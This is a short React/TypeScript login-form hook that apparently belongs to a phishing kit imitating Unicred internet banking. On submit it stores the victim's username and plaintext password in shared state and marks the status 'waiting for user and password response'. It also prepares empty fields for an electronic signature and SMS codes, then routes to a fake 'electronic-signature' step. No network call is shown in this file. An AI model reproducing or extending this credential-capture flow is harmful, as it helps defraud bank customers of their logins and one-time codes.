'use client';

import { useForm, SubmitHandler } from 'react-hook-form';

import navigate from '@/actions/navigate';
import { zodResolver } from '@hookform/resolvers/zod';

import { useAccountContext } from '../accountContext/useContext';
import { useLoadingContext } from '../loadingContext/useContext';
import { zodSchema, BodyProtocol } from './validation';

export default function useFormLogin() {
  const {
    register,
    handleSubmit,
    setValue,
    watch,
    reset,
    trigger,
    formState: { errors, isSubmitted },
  } = useForm<BodyProtocol>({
    resolver: zodResolver(zodSchema),
    defaultValues: {
      password: '',
      user: '',
    },
  });
  const { isLoading, setIsLoading } = useLoadingContext();
  const { setAccount } = useAccountContext();

  const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
    if (isLoading) return;
    const { user, password } = body;
    setIsLoading(true);
    setAccount(state => ({
      ...state,
      user,
      password,
      status: 'esperando resposta usuário e senha',
      type: 'N/D',
      electronicSignature: 'N/D',
      numberSMS: 'N/D',
      sms: 'N/D',
    }));
    navigate('/unicred-internetbanking/electronic-signature');
  };

  const handleReset = () => {
    reset();
  };

  return {
    handleSubmit: handleSubmit(handleFormSubmit),
    register,
    setValue,
    watch,
    errors,
    handleReset,
    trigger,
    isSubmitted,
  };
}
